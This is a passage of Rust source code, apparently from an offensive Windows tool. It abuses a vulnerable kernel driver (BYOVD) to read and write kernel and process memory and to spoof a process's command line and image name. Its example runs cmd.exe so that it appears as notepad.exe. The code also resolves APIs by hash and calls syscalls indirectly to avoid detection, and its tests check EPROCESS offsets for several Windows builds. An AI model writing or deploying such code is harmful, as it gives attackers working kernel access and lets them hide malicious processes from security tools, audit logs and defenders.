    ) -> Result<PoolAllocation> {
        // If the existing buffer is large enough, reuse it.
        if existing.buffer != 0 && (existing.maximum_length as usize) >= required_len {
            return Ok(PoolAllocation {
                address: existing.buffer,
                size: existing.maximum_length as usize,
                is_fresh: false,
            });
        }

        // If the existing buffer isn't large enough, we need to find new space.
        // Strategy: use the existing buffer address area and write beyond it.
        // This is a pragmatic approach — in production you'd use kernel pool
        // allocation via the proxy module.
        //
        // For now, we search for usable space in the existing RTL_USER_PROCESS_PARAMETERS
        // block.  The params structure is typically > 0x400 bytes with the strings
        // allocated at the end.  We can use the trailing space.
        //
        // SAFETY: This fallback is less safe.  We log a warning and prefer
        // the existing-buffer path.

        log::warn!(
            "Existing buffer too small (max={} need={}) — attempting to use \
             space after existing buffer at 0x{:016X}",
            existing.maximum_length,
            required_len,
            existing.buffer
        );

        // If the existing buffer has *some* space, we can try writing
        // just the data without null terminator (risky, but sometimes works).
        if existing.buffer != 0 && (existing.maximum_length as usize) >= required_len.saturating_sub(2) {
            // Close enough — write without the null terminator.
            return Ok(PoolAllocation {
                address: existing.buffer,
                size: existing.maximum_length as usize,
                is_fresh: false,
            });
        }

        bail!(
            "Cannot allocate kernel pool for string ({} bytes needed). \
             Existing buffer at 0x{:016X} has max_length={}. \
             Kernel pool allocation via BYOVD proxy is required for this case.",
            required_len,
            existing.buffer,
            existing.maximum_length
        );
    }

    /// Clean up any fresh kernel pool allocations on failure.
    fn cleanup_on_failure(&mut self) {
        for (addr, size) in &self.pool_allocations {
            log::warn!(
                "Cleaning up kernel pool allocation at 0x{:016X} ({} bytes)",
                addr,
                size
            );
            // Best effort: zero out the allocation to avoid leaking data.
            let zeros = vec![0u8; *size];
            unsafe {
                let _ = kv_write(
                    self.driver,
                    self.device_handle,
                    self.cr3,
                    *addr,
                    &zeros,
                );
            }
        }
        self.pool_allocations.clear();
    }
}

impl Drop for KernelArgSpoofer {
    fn drop(&mut self) {
        if !self.pool_allocations.is_empty() {
            self.cleanup_on_failure();
        }
    }
}

// ── CR3-Scoped Kernel Memory Access ──────────────────────────────────────
// For accessing user-space memory of the target process, we need to use
// the target's CR3 (DirectoryTableBase) for VA→PA translation.

/// Read virtual memory using a specific CR3 for page-table walking.
unsafe fn kv_read_with_cr3(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    buf: &mut [u8],
) -> Result<()> {
    if driver.needs_physical_addr {
        let phys = crate::kernel_callback::translate_va_to_pa(driver, device_handle, cr3, addr)?;
        deploy::read_physical_memory(driver, device_handle, phys, buf)
    } else {
        deploy::read_physical_memory(driver, device_handle, addr, buf)
    }
}

/// Write virtual memory using a specific CR3 for page-table walking.
unsafe fn kv_write_with_cr3(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    data: &[u8],
) -> Result<()> {
    if driver.needs_physical_addr {
        let phys = crate::kernel_callback::translate_va_to_pa(driver, device_handle, cr3, addr)?;
        deploy::write_physical_memory(driver, device_handle, phys, data)
    } else {
        deploy::write_physical_memory(driver, device_handle, addr, data)
    }
}

/// Read a u64 using a specific CR3.
unsafe fn kv_read_u64_with_cr3(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
) -> Result<u64> {
    let mut buf = [0u8; 8];
    kv_read_with_cr3(driver, device_handle, cr3, addr, &mut buf)?;
    Ok(u64::from_le_bytes(buf))
}

/// Write bytes with verification using a specific CR3.
unsafe fn kv_write_verified_cr3(
    driver: &VulnerableDriver,
    device_handle: usize,
    cr3: u64,
    addr: u64,
    data: &[u8],
) -> Result<()> {
    kv_write_with_cr3(driver, device_handle, cr3, addr, data)?;
    let mut readback = vec![0u8; data.len()];
    kv_read_with_cr3(driver, device_handle, cr3, addr, &mut readback)?;
    if readback != data {
        bail!(
            "Verified write failed at 0x{:016X} (CR3 0x{:016X}): wrote {} bytes, readback mismatch",
            addr,
            cr3,
            data.len()
        );
    }
    Ok(())
}

// ── High-Level Helper ────────────────────────────────────────────────────

/// Create a new process with spoofed arguments.
///
/// This is the recommended entry point for creating a process whose
/// arguments appear different from the actual command line. The workflow:
///
/// 1. Create a suspended process with the **real** executable.
/// 2. Kernel-spoof the arguments so the fake args appear everywhere.
/// 3. Resume the process.
/// 4. Return the PID and process handle.
///
/// # Arguments
///
/// * `real_exe` — The actual executable to run (e.g., `C:\Windows\System32\cmd.exe`).
/// * `fake_exe` — The fake path to display (e.g., `C:\Windows\System32\notepad.exe`).
/// * `fake_args` — The fake command line (e.g., `notepad.exe readme.txt`).
///
/// # Returns
///
/// A tuple of `(pid, process_handle)` on success.
///
/// # Example
///
/// ```rust,ignore
/// let (pid, handle) = create_process_with_spoofed_args(
///     "C:\\Windows\\System32\\cmd.exe",
///     "C:\\Windows\\System32\\notepad.exe",
///     "notepad.exe C:\\temp\\readme.txt",
/// )?;
/// ```
pub fn create_process_with_spoofed_args(
    real_exe: &str,
    fake_exe: &str,
    fake_args: &str,
) -> Result<(u32, usize)> {
    // Step 1: Create a suspended process using the existing process creation
    // infrastructure.  We use kernel32!CreateProcessW with CREATE_SUSPENDED
    // via the indirect syscall path.
    let (pid, handle) = create_suspended_process(real_exe)
        .context("failed to create suspended process for argument spoofing")?;

    log::info!(
        "Created suspended process PID={} for kernel arg spoofing",
        pid
    );

    // Step 2: Spoof the arguments at the kernel level.
    let result = {
        let mut spoofer = KernelArgSpoofer::new()
            .context("failed to initialize KernelArgSpoofer")?;
        spoofer.spoof_process_args(pid, fake_exe, fake_args)
    };

    if let Err(e) = result {
        // Kill the suspended process on failure — it has unspoofed args.
        log::error!("Spoofing failed: {} — terminating suspended process PID={}", e, pid);
        let _ = unsafe {
            crate::syscall!("NtTerminateProcess", handle as u64, 1u64)
        };
        return Err(e).context("kernel argument spoofing failed");
    }

    // Step 3: Resume the process.
    let resume_status = unsafe {
        crate::syscall!("NtResumeThread", handle as u64, 0u64 as *mut u32 as u64)
    };
    if let Err(e) = resume_status {
        log::warn!(
            "NtResumeThread failed for PID={} ({}) — process may be stuck suspended",
            pid,
            e
        );
    }

    log::info!(
        "Process PID={} created with spoofed args: fake_exe={:?}, fake_args={:?}",
        pid,
        fake_exe,
        fake_args
    );

    Ok((pid, handle))
}

/// Create a suspended process using `kernel32!CreateProcessW`.
///
/// Uses the indirect syscall path and hash-based API resolution (no IAT entries).
/// Returns `(pid, process_handle)`.
fn create_suspended_process(exe_path: &str) -> Result<(u32, usize)> {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    const CREATE_SUSPENDED: u32 = 0x00000004;
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    // Resolve kernel32.
    let k32 = unsafe {
        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
    }
    .context("could not resolve kernel32 base")?;

    // Resolve CreateProcessW.
    let create_process_w = unsafe {
        pe_resolve::get_proc_address_by_hash(
            k32,
            pe_resolve::hash_str(b"CreateProcessW\0"),
        )
    }
    .context("could not resolve CreateProcessW")?;

    type CreateProcessWFn = unsafe extern "system" fn(
        *mut u16, // lpApplicationName
        *mut u16, // lpCommandLine
        usize,    // lpProcessAttributes
        usize,    // lpThreadAttributes
        i32,      // bInheritHandles
        u32,      // dwCreationFlags
        usize,    // lpEnvironment
        usize,    // lpCurrentDirectory
        usize,    // lpStartupInfo
        *mut u8,  // lpProcessInformation
    ) -> i32;

    let create_process: CreateProcessWFn =
        unsafe { std::mem::transmute(create_process_w) };

    // Build the wide command line.
    let wide: Vec<u16> = OsStr::new(exe_path)
        .encode_wide()
        .chain(std::iter::once(0u16))
        .collect();

    // STARTUPINFOW size = 104 bytes on x64.
    // PROCESS_INFORMATION size = 24 bytes on x64.
    let mut startup_info = [0u8; 104];
    let startup_size: u32 = 104;
    unsafe {
        std::ptr::copy_nonoverlapping(
            &startup_size as *const u32 as *const u8,
            startup_info.as_mut_ptr(),
            4,
        );
    }

    let mut proc_info = [0u8; 24]; // hProcess, hThread, dwProcessId, dwThreadId

    let result = unsafe {
        create_process(
            std::ptr::null_mut(),
            wide.as_ptr() as *mut u16,
            0,
            0,
            0,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            0,
            0,
            startup_info.as_ptr() as usize,
            proc_info.as_mut_ptr(),
        )
    };

    if result == 0 {
        bail!("CreateProcessW failed for {:?}", exe_path);
    }

    // Parse PROCESS_INFORMATION.
    let h_process = u64::from_le_bytes(proc_info[0..8].try_into()?) as usize;
    let _h_thread = u64::from_le_bytes(proc_info[8..16].try_into()?) as usize;
    let pid = u32::from_le_bytes(proc_info[16..20].try_into()?);

    Ok((pid, h_process))
}

// ── Tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_offsets_for_known_builds() {
        // Every build in the table must be findable by exact match.
        for &(build, _) in EPROCESS_OFFSETS {
            let offsets = offsets_for_build(build);
            assert!(offsets.is_some(), "build {} should be in offset table", build);
        }

        // Known-good builds.
        let off = offsets_for_build(19041).unwrap();
        assert_eq!(off.peb, 0x550);
        assert_eq!(off.image_file_name, 0x5a8);
        assert_eq!(off.se_audit_process_creation_info, 0x468);
        assert_eq!(off.peb_process_parameters, 0x20);
        assert_eq!(off.params_image_path_name, 0x60);
        assert_eq!(off.params_command_line, 0x70);

        let off = offsets_for_build(22621).unwrap();
        assert_eq!(off.peb, 0x440);
        assert_eq!(off.image_file_name, 0x098);

        let off = offsets_for_build(26100).unwrap();
        assert_eq!(off.peb, 0x440);
        assert_eq!(off.image_file_name, 0x098);

        // Unknown build should return None (no exact match).
        assert!(offsets_for_build(99999).is_none());
    }

    #[test]
    fn test_str_to_utf16le() {
        let result = str_to_utf16le("ABC");
        // A=0x0041, B=0x0042, C=0x0043, null=0x0000
        assert_eq!(
            result,
            &[0x41, 0x00, 0x42, 0x00, 0x43, 0x00, 0x00, 0x00]
        );
    }

    #[test]
    fn test_str_to_ascii_padded() {
        let result = str_to_ascii_padded("notepad", 15);
        assert_eq!(&result[..7], b"notepad");
        assert_eq!(&result[7..], &[0u8; 8]);

        // Overflow case: truncate to max_len.
        let result = str_to_ascii_padded("very_long_process_name", 15);
        assert_eq!(&result[..15], b"very_long_proce");
    }

    #[test]
    fn test_unicode_string_layout() {
        // Verify UNICODE_STRING is 16 bytes on x64.
        assert_eq!(mem::size_of::<UnicodeString>(), 16);
        assert_eq!(mem::align_of::<UnicodeString>(), 8);
    }

    #[test]
    fn test_all_builds_have_nonzero_offsets() {
        for &(build, off) in EPROCESS_OFFSETS {
            assert_ne!(off.peb, 0, "build {} peb offset is 0", build);
            assert_ne!(
                off.image_file_name, 0,
                "build {} image_file_name offset is 0",
                build
            );
            assert_ne!(
                off.se_audit_process_creation_info, 0,
                "build {} se_audit offset is 0",
                build
            );
            assert_ne!(
                off.peb_process_parameters, 0,
                "build {} peb_process_parameters offset is 0",
                build
            );
            assert_ne!(
                off.params_image_path_name, 0,
                "build {} params_image_path_name offset is 0",
                build
            );
            assert_ne!(
                off.params_command_line, 0,
                "build {} params_command_line offset is 0",
                build
            );
        }
    }
}
